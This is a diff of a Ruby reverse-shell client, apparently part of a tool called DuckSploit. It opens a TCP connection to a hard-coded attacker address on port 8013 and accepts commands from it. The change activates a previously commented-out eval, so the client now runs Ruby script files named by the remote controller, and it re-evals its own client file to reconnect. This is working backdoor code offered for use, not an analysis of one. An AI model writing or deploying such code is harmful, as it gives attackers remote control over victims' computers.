@@ -1,22 +1,13 @@
 require "socket"
+require "colorize"
 
-host = "192.168.1.46"
+
+# host = "duckpvp1.ddns.net"
+host = "192.168.1.50"
 port = 8013
-
-# dspath = "E:\DuckSploit\ruby\reverse_shell\client.rb"
-
-
-
-# def background_check
-	# sleep(5)
-	# exec("E:\DuckSploit\ruby\reverse_shell\client.rb")
-# end
-
-# background_check()
 
 loop do
 	host = TCPSocket.open(host, port)
-	host.puts ""
 	
 	loop do
 		cmd = host.gets.chomp
@@ -25,21 +16,15 @@ loop do
 			host.close
 			break
 		else
-			begin
-				filepath = "C:/DuckSploit/ruby/#{downcasecmd}.rb".chomp
-				if File.exist?(filepath)
-					out = "exist #{downcasecmd}\n"
-					# eval File.read("C:/DuckSploit/ruby/#{downcasecmd}.rb")				
-				else
-					out = "Command (#{downcasecmd}) does not exist!\n"
-				end
-				host.puts out.gsub("\n", "\\NEWLINE")
-				
-			rescue
-				out = "Unable to execute command\n"
+			filepath = "C:/DuckSploit/ruby/#{downcasecmd}.rb".chomp
+			if File.exist?(filepath)
+				eval File.read("C:/DuckSploit/ruby/#{downcasecmd}.rb")				
+			else
+				out = "[".red.bold.blink + "x".white.bold.blink + "] Command (".red.bold.blink + "#{downcasecmd}".yellow.blink + ") does not exist!\n\n".red.bold.blink
 			end
 			host.puts out.gsub("\n", "\\NEWLINE")
 		end
 	end
+	eval File.read("E:\DUCKSPLOIT\ruby\reverse_shell\client.rb")
 end
 exit
